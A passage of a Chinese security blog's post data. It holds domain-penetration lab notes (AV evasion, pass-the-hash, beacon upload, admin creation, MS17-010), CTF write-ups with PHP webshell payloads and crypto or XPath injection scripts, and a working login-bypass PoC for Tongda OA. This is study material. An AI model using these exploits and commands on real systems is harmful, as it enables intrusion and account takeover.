一开始使用AVIator制作msf的免杀，但是1min就被杀了。。 直接使用冰蝎的msf联动 1set payload java&#x2F;meterpreter&#x2F;reverse_tcp 但是得到的不是windows/meterpreter/， 使用shellter制作msf免杀，使用getuid等能正常使用，（注意getsystem会被360拦截，这和免杀无关，系统补丁有关，所以在有杀软的情况下强烈建议不要使用）。 使用shellcode加载器免杀cs，成功上线并执行命令 system权限，再和msf联动 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 0.0.0.0set lport 1235exploit cs开个socks4a代理 五、信息收集本机信息收集 123456789101112net view 获取同一域的计算机列表ipconfig &#x2F;allnslookup test.labsysteminfotasklist 观察是否存在杀软netuser 域控才存在krbtgtnet localgroup administratorquery user || qwinsta 3389可能无法登陆netstat -ano 观察pid是否establish03之前：netsh firewall set opmode disable03之后：netsh advfirewall set allprofiles state off查看防火墙配置：netsh firewall show config 域信息收集 12345whoami &#x2F;all 查看sidnet user xxx &#x2F;domain 要求在域里面net config workstationnet time &#x2F;domain 快速定位是否存在域net group &quot;Domain Controllers&quot; &#x2F;domain 探测域内存活主机 icmp协议探活 1for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot; 1nbtscan-1.0.35.exe 10.10.10.0&#x2F;24 1&quot;arp-scan(x64).exe&quot; -t 10.10.10.0&#x2F;24 基本确定域中3台主机 端口扫描 s扫描器 1S.exe TCP 10.10.10.10 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,20,49,111,256 &#x2F;Banner &#x2F;save 1S.exe TCP 10.10.10.201 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,20,49,111,256 &#x2F;Banner &#x2F;save nmap 1proxychains nmap -sT -Pn -T4 10.10.10.10 msf（添加路由或者） 1use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp 六、横向渗透cs使用mimikatz 既然知道了域控密码，CS内网上线 使用wmiexec 12345678git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binariespython setup.py installcd examples#由于密码中有个@,这里采用hashes的方式proxychains python wmiexec.py -debug &#39;administrator:Gqy123@@1@10.10.10.10&#39;proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:7146afd69485333d5c2028451fdd2a11 &#39;administrator@10.10.10.10&#39; 上传beacon.exe 使用ipc传文件到域控 123456net use \\\\10.10.10.10\\ipc$ 1qaz@WSX &#x2F;user:de1aydir \\\\10.10.10.10\\c$copy beacon.exe \\\\10.10.10.10\\c$dir \\\\10.10.10.10\\c$#定时任务启动at \\\\10.10.10.10 10:00 c:\\\\beacon.exe 使用smbclient传文件 12proxychains smbclient &#x2F;&#x2F;10.10.10.10&#x2F;c$ -U administratorput beacon.exe 利用wmi执行 成功 七、内网漏洞如果前面mimikatz没有拿到密码，根据开放的端口进行相应的测试 3389添加用户远程登录 关闭防火墙 1netsh adcfirewall set allprofiles state off 1meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp 下面的操作会被360拦截 1234567#新建用户net user gqy Abc1234 &#x2F;add#将用户添加到本地组net localgroup administrators gqy &#x2F;add#开启3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;vfDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 12meterpreter&gt;run post&#x2F;windows&#x2F;manage&#x2F;enable_rdpmeterpreter&gt;run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp username&#x3D;&quot;gqy&quot; password&#x3D;&quot;Abc1234&quot; 尝试关闭360杀软 12meterpreter&gt;run killavmeterpreter&gt;run post&#x2F;windows&#x2F;manage&#x2F;killav 失败，遂作罢 445端口尝试ms17-010 1234567891011proxychains msfconsolesearch ms17-010use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010set RHOSTS 10.10.10.10 10.10.10.201set threads 50runuse auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset RHOSTS 10.10.10.10set COMMAND whoamirun 得到了system权限","categories":[],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://glotozz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"36DCTF-wp","slug":"36DCTF-wp","date":"2020-05-01T02:49:49.000Z","updated":"2020-05-06T13:21:12.624Z","comments":true,"path":"2020/05/01/36DCTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/05/01/36DCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 WEB_给你shell WEB_WUSTCTF朴实无华Revenge WEB_ALL_INFO_U_WANT 整体质量还是不错，但是自己没做几题。。 WEB_给你shell12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php//It's no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include \"config.php\";if (isset($_GET['view_source'])) &#123; show_source(__FILE__); die;&#125;function checkCookie($s) &#123; $arr = explode(':', $s); if ($arr[0] === '&#123;\"secret\"' &amp;&amp; preg_match('/^[\\\"0-9A-Z]*&#125;$/', $arr[1]) &amp;&amp; count($arr) === 2 ) &#123; return true; &#125; else &#123; if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1); return false; &#125;&#125;function haveFun($_f_g) &#123; $_g_r = 32; $_m_u = md5($_f_g); $_h_p = strtoupper($_m_u); for ($i = 0; $i &lt; $_g_r; $i++) &#123; $_i = substr($_h_p, $i, 1); $_i = ord($_i); print_r($_i &amp; 0xC0); &#125; die;&#125;isset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '&#123;\"secret\":\"' . strtoupper(md5('y1ng')) . '\"&#125;', time()+7200 );checkCookie($json) ? $obj = @json_decode($json, true) : die('no');if ($obj &amp;&amp; isset($_GET['give_me_shell'])) &#123; ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo \"here is your webshell: $shell_path\";&#125;die; cookie伪造，限制了由&quot;0-9A-Z构成 仔细观察发现存在绕过，不然这题就没法做了。。 C0 1100 0000 md5值由0-9a-f组成，并且这里转为大写 48-57，65-70 48 0011 0000 65 0100 0001 根据&amp;的运算规则，某一位为0，可以知道&amp;前为数字 对题目返回的md5进行判断 10006464640064064646464006406464064640064006400000000000 因为前3位为数字，可以爆破（传001会json_decode失败），再利用弱类型比较 12345678910111213141516171819202122232425262728293031 &lt;?phperror_reporting(0);session_start();//there are some secret waf that you will never know, fuzz me if you canrequire \"hidden_filter.php\";if (!$_SESSION['login']) die('&lt;script&gt;location.href=\\'./index.php\\'&lt;/script&gt;');if (!isset($_GET['code'])) &#123; show_source(__FILE__); exit();&#125; else &#123; $code = $_GET['code']; if (!preg_match($secret_waf, $code)) &#123; //清空session 从头再来 eval(\"\\$_SESSION[\" . $code . \"]=false;\"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker &#125; else die('hacker');&#125;/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! * ————Deep CTF 2020*/ X-Powered-By: PHP/7.3.11 将php的内置函数fuzz一遍，还是有不少可用的， 再把单字符fuzz一遍 括号被过滤我裂开了呀 ===========================看了wp payload 1?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt; 核心是：PHP黑魔法 require和取反运算符之间不需要空格照样执行，以及?&gt;&lt;?绕过分号 类似的还有&lt;?=include$_GET[1];?&gt;当然这里被过滤了 搜索flag 1find &#x2F;etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot; WEB_WUSTCTF朴实无华Revenge12345678910111213141516171819//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; $numPositve = intval($num); $numReverse = intval(strrev($num)); if (preg_match('/[^0-9.-]/', $num)) &#123; die(\"非洲欢迎你1\"); &#125; if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧 die(\"非洲欢迎你2\"); &#125; if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123; echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\"; &#125;else&#123; die(\"金钱解决不了穷人的本质问题\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125; 利用浮点精度：num=1000000000000000.00000000000000010 第二关：$md5=md5(md5($md5)，暴力fuzz出md5=0e4604768110902957 第三关ca&#39;&#39;t%09/flag WEB_ALL_INFO_U_WANT题目环境为nginx/1.14.0 (Ubuntu) 一开始一直没去试日志，因为以为没权限（之前测试apache2的日志权限默认www-data是没有权限访问的） 默认权限：nginx以_www用户运行，日志文件access.log等的权限皆为：_www _www rw------- 因此可以包含 蚁剑连上 颖奇师傅的另一种预期解法是只要自己包含自己 就会进入死循环 死循环只能被手工打断或者被nginx超时 临时文件就会被保留了 1?file&#x3D;all_info_u_want.php&amp;all_info_i_want 一开始尝试包含临时文件能读取到tmp_name但是包含不到，这样就能包含到了。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"DASCTF-babytricks-wp","slug":"DASCTF-babytricks-wp","date":"2020-04-25T08:10:35.000Z","updated":"2020-04-26T12:10:05.774Z","comments":true,"path":"2020/04/25/DASCTF-babytricks-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/25/DASCTF-babytricks-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、格式化字符串+万能密码 二、 三、bypass disable_function 一、格式化字符串+万能密码1select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39; 格式化字符串，构造%1$可以吃掉user后面的单引号，passwd=^0，存在许多黑名单，发现^没有被过滤，^0成功登录 二、12345678910111213141516171819&lt;?phperror_reporting(0);session_save_path('session');session_start();require_once './init.php';if($_SESSION['login']!=1)&#123; die(\"&lt;script&gt;window.location.href='./index.php'&lt;/script&gt;\");&#125;if($_GET['shell'])&#123; $shell= addslashes($_GET['shell']); $file = file_get_contents('./shell.php'); $file = preg_replace(\"/\\\\\\$shell = '.*';/s\", \"\\$shell = '&#123;$shell&#125;';\", $file); file_put_contents('./shell.php', $file);&#125;else&#123; echo \"set your shell\".\"&lt;br&gt;\"; chdir(\"/\"); highlight_file(dirname(__FILE__).\"/admin.php\");&#125;?&gt; [小密圈]经典写配置漏洞与几种变形学习 12?shell&#x3D;;phpinfo();?shell&#x3D;$0 三、bypass disable_function1set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail 设置了open_basedir 过滤了mail()、error_log()、ini_set() 1234567int preload()&#123; const char *command; int i; command &#x3D; getenv(&quot;EVIL_CMDLINE&quot;); return system(command);&#125; https://www.anquanke.com/post/id/197745?from=singlemessage fuzz能触发ld_preload的函数， 1234567891011mb_send_mailexecsystempassthrushell_execerror_logmailgnupg_initimap_mailpcntl_execnew gnupg() 这里可以用new gnupg()触发ld_preload 还有个小疑问，为啥要给so文件","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"通达OA < 11.5任意用户登录漏洞分析","slug":"通达OA-11-5任意用户登录漏洞分析","date":"2020-04-22T09:43:04.000Z","updated":"2020-04-28T12:28:14.056Z","comments":true,"path":"2020/04/22/通达OA-11-5任意用户登录漏洞分析/","link":"","permalink":"https://glotozz.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA-11-5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞分析 漏洞复现 参考链接 环境搭建下载通达OA11.5 http://www.tongda2000.com/download/2019.php?F=&amp;K= 官网没有提供V11.4，可以从11.3的服务器管理更新得到。 diff不同，最终找到任意用户登录漏洞触发点 漏洞分析logincheck_code.php intval()防止sql注入，但是这里用户可以伪造任意UID，默认admin用户的UID为1 需要绕过15行的判断，只要查询得到的$login_codeuid不为空即可。 跟进get_cache() 根据传入的id进行查询 那么全局搜索调用set_cache()，并且设置CODE_LOGIN的地方，只有一处 general/login_code.php 那么可以通过这个页面读取code_uid，再去之前的页面伪造身份。 漏洞复现1、 2、 3、 poc 123456789101112131415161718192021# coding=utf-8import requestsimport reurl = \"http://127.0.0.1:8088\"url1 = url + \"/general/login_code.php\"url2 = url + \"/logincheck_code.php\"url3 = url + \"/general/index.php\"r = requests.get(url1).contenttmp = re.search(r'code_uid\":\"(.*?)\"&#125;', r.decode(\"ISO-8859-1\")) # utf-8' codec can't decode byte# print(tmp.group(1))codeuid = tmp.group(1)r = requests.post(url2, data=&#123;'UID': 1, 'CODEUID': codeuid&#125;).headerscookie = r['Set-Cookie'][:-7]# print(tmp)headers = &#123; 'Cookie': cookie&#125;r = requests.get(url3, headers=headers).contentif \"admin\" in r.decode(\"ISO-8859-1\"): print(\"ok\") 参考链接 https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"NPUCTF-wp","slug":"NPUCTF-wp","date":"2020-04-20T10:25:55.000Z","updated":"2020-04-27T12:25:28.609Z","comments":true,"path":"2020/04/20/NPUCTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/20/NPUCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 超简单的PHP！！！超简单！！！ web🐕 RealEzPHP ezlogin ezinclude 验证🐎 ezShiro 超简单的PHP！！！超简单！！！文件包含读源码，主要是下面两个 /phpinfo.php /msg.php 12345678910111213141516171819202122232425&lt;?php header('content-type:application/json');session_start();function safe($msg)&#123; if (strlen($msg)&gt;17)&#123; return \"msg is too loooong!\"; &#125; else &#123; return preg_replace(\"/php/\",\"?\",$msg); &#125;&#125;if (!isset($_SESSION['msg'])&amp;empty($_SESSION['msg']))$_SESSION['msg'] = array();if (isset($_POST['msg']))&#123; array_push($_SESSION['msg'], ['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())]); echo json_encode(array(['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())])); exit();&#125;if(!empty($_SESSION['msg']))&#123; echo json_encode($_SESSION['msg']);&#125; else &#123;echo \"è¿ä¸å¿«å»çè¨ï¼\";&#125;?&gt; 将用户传入的msg写入session文件，给了phpinfo()可知session路径，配合文件包含getshell。 考点是限制了单次写入的msg要17字符以内，看比赛文档的时候看到了思路哈哈哈 1、利用反引号，但是这里disable_func中禁用了shell_exec()，无法使用。 2、利用短标签，这里也关闭了。 3、因为一次写入无法构造，可以利用注释符多次写入 1234&lt;?PHP &#x2F;**&#x2F;eval&#x2F;**&#x2F;($_GET[a]);#?&gt; 直观一点 1msg|a:4:&#123;i:0;a:2:&#123;s:3:&quot;msg&quot;;s:9:&quot;&lt;?PHP &#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:56&quot;;&#125;i:1;a:2:&#123;s:3:&quot;msg&quot;;s:8:&quot;*&#x2F;eval&#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:58&quot;;&#125;i:2;a:2:&#123;s:3:&quot;msg&quot;;s:14:&quot;*&#x2F;($_GET[a]);#&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:09&quot;;&#125;i:3;a:2:&#123;s:3:&quot;msg&quot;;s:2:&quot;?&gt;&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:17&quot;;&#125;&#125; 最后bypass可以利用error_log()触发ld_preload web🐕源码 123456789101112131415161718192021222324252627282930313233343536&lt;?php error_reporting(0);include('config.php'); # $key,$flagdefine(\"METHOD\", \"aes-128-cbc\"); //定义加密方式define(\"SECRET_KEY\", $key); //定义密钥define(\"IV\",\"6666666666666666\"); //定义初始向量 16个6define(\"BR\",'&lt;br&gt;');if(!isset($_GET['source']))header('location:./index.php?source=1');#var_dump($GLOBALS); //听说你想看这个？function aes_encrypt($iv,$data)&#123; echo \"--------encrypt---------\".BR; echo 'IV:'.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;&#125;function aes_decrypt($iv,$data)&#123; return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False');&#125;if($_GET['method']=='encrypt')&#123; $iv = IV; $data = $flag; echo aes_encrypt($iv,$data);&#125; else if($_GET['method']==\"decrypt\")&#123; $iv = @$_POST['iv']; $data = @$_POST['data']; echo aes_decrypt($iv,$data);&#125;echo \"我摊牌了，就是懒得写前端\".BR;if($_GET['source']==1)highlight_file(__FILE__);?&gt; 传method=encrypt可以得到IV和$flag加密后的密文， 传method=decrypt可以对传入的IV和data进行解密 12345唯密文攻击：只知道密文已知明文攻击：得到了一些特定的明文与对应的密文选择明文攻击：攻击者可以任意选择一些明文，并得到对应的密文选择密文攻击：攻击者可以任意的制造或者选择一些密文，并得到对应的明文选择文本攻击：攻击者可以制造任意的明文&#x2F;密文，并得到对应的密文&#x2F;明文，也就是选择明文攻击+选择密文攻击 这题符合CBC选择密文攻击，但是一般用来得到IV的，但是这里给了IV 并且理论上可以直接将给我们的密文解密，返回了一个1，是因为增加了openssl_decrypt() or die(&#39;False&#39;)，导致正常解密会返回1，有想着本地测试把这个删除，但是由于key未知，无法成功解密 没啥别的想法，搜openssl_decrypt()的bug也没收获，遂作罢 ==========================重新看一下 CBC模式的加密方式是通过一个初始向量（IV）先和明文分组第一组异或后使用秘钥K加密，作为第一组密文，同时又与后一分组的明文异或后进行加密产生下一组密文，依次重复。其解密和加密是对称的，密文先解密，再异或。 Padding Oracle Attack https://www.cnblogs.com/p00mj/p/11797786.html 条件：已知IV和密文，可以利用服务端解密 结果：获取密文对应的明文(如果分组大于1组，没有IV的情况这里可以获取到部分明文) 和题目给的条件完全符合。 分组加密中数据填充常用的方式（PKCS#5） 核心思想（比如求最后一位） 穷举IV，当正常解密时（0x3C）即可利用明文0x01 xor 0x3C得到中间值为0X3D，而原始IV为0X39， 明文 = 中间值 xor IV， 12340x01 &#x3D; 中间值 xor 0x3c待求明文 &#x3D; 中间值 xor 0x39&#x3D;&gt;待求明文 &#x3D; 0x01 xor 0x3c xor 0x39 exp 1234567891011121314151617181920212223242526272829303132import requestsimport base64url = 'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'N = 16l = [0] * Niv = '6666666666666666'tmp_iv = ''out = [0] * Ns = ''for i in range(1, N+1): for c in range(0,256): l[N-i] = c tmp_iv = '' for m in l: tmp_iv += chr(m) print base64.b64encode(tmp_iv) # print payload data = &#123; 'iv': tmp_iv, 'data': 'ly7auKVQCZWum/W/4osuPA==', &#125; data = requests.post(url, data=data).content.decode('utf-8') if 'False' not in data: out[N-i] = c ^ i for y in range(i): l[N-y-1] = out[N-y-1] ^ (i+1) breakfor i in range(N): out[i] = out[i] ^ ord(iv[i])for c in out: s += chr(c)print s 第二关源码 1234567891011121314151617181920212223242526272829303132 &lt;?php #error_reporting(0);include('config.php'); //$fl4gdefine(\"METHOD\", \"aes-128-cbc\");define(\"SECRET_KEY\", \"6666666\");session_start();function get_iv()&#123; //生成随机初始向量IV $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;$lalala = 'piapiapiapia';if(!isset($_SESSION['Identity']))&#123; $_SESSION['iv'] = get_iv(); $_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv']));&#125;echo base64_encode($_SESSION['iv']).\"&lt;br&gt;\";if(isset($_POST['iv']))&#123; $tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv'])); echo $tmp_id.\"&lt;br&gt;\"; if($tmp_id ==='weber')die($fl4g);&#125;highlight_file(__FILE__);?&gt; cbc字节翻转攻击 以前接触的一般是已知IV，一组明文和密文，伪造密文得到想要的明文。 但是由于这里加密的明文较短（16位以内），并且可以伪造IV，也可以进行CBC字节翻转 exp 12345678910# coding=utf-8import base64 as b64source_str = 'piapiapiapia' + 4 * '\\x04'target_srt = 'weber' + 11 * '\\x0b'token = 'sS8OuVOl9tyCkzAzsabGBA==' # 你获得的初始IV的base64encode值token = list(b64.b64decode(token))for x in range(0, len(target_srt)): token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))print b64.b64encode(''.join(token)) 刚想打好像环境没了。。 ===========================第二天buu上的环境就搭好了哈哈 得到网盘地址下载得到HelloWorld.class，jd-gui反编译得到flag RealEzPHP源码 1234567891011121314151617181920212223242526&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = \"Y-m-d h:i:s\"; $this-&gt;b = \"date\"; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET['source']))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[\"data\"]);2020-04-20 12:59:59 利用assert()命令执行， 12345phpinfo()&#x3D;&gt;PHP Version 7.0.33disable_functionpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir 下一步 12345678var_dump(scandir(&#39;&#x2F;&#39;))&#x3D;&gt;string(10) &quot;FIag_!S_it&quot;禁用了readfile,尝试file_get_contents()var_dump(base64_encode(file_get_contents(\\&#39;&#x2F;FIag_!S_it\\&#39;)))&#x3D;&gt;string(64) &quot;TlBVQ1RGe3RoaXNfaXNfbm90X2FfZmFrZV9mbGFnX2J1dF90cnVlX2ZsYWd9Cg&#x3D;&#x3D;&quot; 可惜flag是错的，想办法连蚁剑，通过下面的方式写入一句话 1file_put_contents(&#39;1.php&#39;, base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;&#39;)) 一开始自己的测试环境是php7.1.9，但是发现在php7.1.9中无法正常写入，提示Cannot call assert() with string argument dynamically，切换成php7.0.9成功写入。网上解释的也不清楚，最好的办法还是切成和题目相同的环境 最后可以通过error_log()bypass，非预期解是phpinfo()中的环境变量 ezloginhint：请自行了解XPath盲注，路径表达式可用于选取XML文档中的节点或者节点集 xpath注入详解 xpath注入指北 demo 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;a&gt; &lt;b&gt; &lt;id&gt;2&lt;/id&gt; &lt;age&gt;3&lt;/age&gt; &lt;/b&gt; &lt;b&gt; &lt;id&gt;3&lt;/id&gt; &lt;age&gt;5&lt;/age&gt; &lt;/b&gt; &lt;secret&gt;flag&#123;xxx&#125;&lt;/secret&gt;&lt;/a&gt; 查询语句 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 常规注入 万能密码1（已知一个节点） 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 万能密码2（无需知道节点） 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or 1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 节点遍历 |表示计算两个节点集，//*表示选取文档中所有元素 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 布尔盲注 之前的节点遍历虽然选取到了所有数据，但是通常不会打印出来，打印一部分或者只是用来做个判断。 判断根节点数量 /表示从根节点选取 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39;or count(&#x2F;)&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 正常回显说明只有一个根节点 获取根节点长度 /*[1]表示先选取所有根节点，再取第一个元素 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or string-length(name(&#x2F;*[1]))&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 正常回显说明根节点长度为1 获取根节点 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(name(&#x2F;*[1]), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 正常回显说明根节点第一位为a 获取文本 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(&#x2F;a&#x2F;b&#x2F;id&#x2F;text(), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] 解题思路 先万能密码测试， 12342&#39; or &#39;1&#x3D;&gt;用户名或密码错误2&#39; or 1 or &#39;1&#x3D;&gt;非法操作 说明非法操作是条件为真的情况下，写个脚本 exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# coding=utf-8import requestsdef req(username): import re url = 'http://ha1cyon-ctf.fun:30100/' s = requests.session() r = s.get(url).content # print r.decode('utf-8') re = re.search(r'value=\"(.*?)\" /&gt;', r.decode('utf-8')) token = re.group(0)[7:-4] # print token headers = &#123; 'Content-Type': 'application/xml', &#125; password = '' data = '&lt;username&gt;'+username+'&lt;/username&gt;' \\ '&lt;password&gt;'+password+'&lt;/password&gt;' \\ '&lt;token&gt;'+token+'&lt;/token&gt;' r = s.post(url, headers=headers, data=data).content # print r.content.decode('utf-8') if '非法操作' in r.decode('utf-8'): print(\"ok\") return 1 else: return 0def test(): req(\"2' or '1\") req(\"2' or 1 or '1\")def getlen(): len = 0 for i in range(1, 40): # username = \"' or string-length(name(/*[1]))=&#123;&#125; or '1\".format(i) # username = \"' or string-length(name(/root/*[1]))=&#123;&#125; or '1\".format(i) # username = \"' or string-length(name(/root/accounts/user/*[3]))=&#123;&#125; or '1\".format(i) username = \"' or string-length(/root/accounts/user[2]/password/text())=&#123;&#125; or '1\".format(i) print(username) res = req(username) if res == 1: return ilen = getlen()flag = \"\"for i in range(len): for j in range(40, 127): # username = \"'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # username = \"'or substring(name(/root*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # username = \"'or substring(name(/root/accounts/user/*[3]), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # id,username,password username = \"'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # guest,adm1n # cf7414b5bdb2e65ee43083f4ddbc4d9f=&gt;gtfly123 print(username) res = req(username) if res == 1: flag += chr(j) print(flag) break 登录后台，发现文件包含，提示/flag 发现黑名单，使用大小写成功绕过 1Php:&#x2F;&#x2F;filter&#x2F;Read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag ezinclude提示md5($secret.$name)===$pass 扫目录，dir.php显示了某个目录下的文件，和config.php =======================当时没有啥思路 参考链接 md5($secret.$name)===$pass说明是hash长度扩展攻击， 利用条件： 1、secret的长度 2、data的值 3、secret+data的值 其中secret的长度可爆破，写个脚本 一个经典的例子 1$COOKIE[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)) 1hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a gqy 将得到的结果第一行作为getmein，第二行作为password poc 12345678910111213import requestsimport hashpumpyimport urlliburl='http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn?'for i in range(40): # 传admin得到hash a, b = hashpumpy.hashpump('973225ae4fc8977f86d1a330b0774630','admin','1',i) print(a, b) req = requests.get(url+\"name=&#123;&#125;&amp;pass=&#123;&#125;\".format(urllib.quote(b),a)) if 'username/password error' not in req.text: print(req.text,url+\"name=&#123;&#125;&amp;pass=&#123;&#125;\".format(urllib.quote(b),a)) 